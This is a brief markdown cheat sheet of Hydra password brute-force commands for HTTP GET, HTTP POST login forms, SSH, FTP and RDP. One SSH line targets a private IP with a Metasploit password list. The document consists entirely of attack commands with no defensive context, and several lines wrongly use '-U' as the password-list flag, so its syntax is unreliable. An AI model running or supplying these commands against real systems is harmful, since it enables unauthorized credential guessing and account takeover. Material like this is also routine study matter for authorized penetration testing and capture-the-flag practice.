# for brute force 
## GET-METHOD
>Hydra -L **username wordlist** -U **password wordlist**  <ip address> http-get  (method or protoccol used ) /webdav (directory) 
## Post-Web-Form
>hydra -L**<username>** -U **<wordlist>** **MACHINE_IP** http-post-form "<path>:<login_credentials>:<invalid_response>"

## SSH
```bash
>hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 ssh://192.168.1.123
>hydra -l <username> -P <full path to pass> <ip_address> -t 4 ssh
```
## FTP
>hydra -L **user** -P **passlist.txt** ftp:<ip address>


## RDP
>hydra -L <list> -P <password list> rdp://<IP> -s <port_number> 




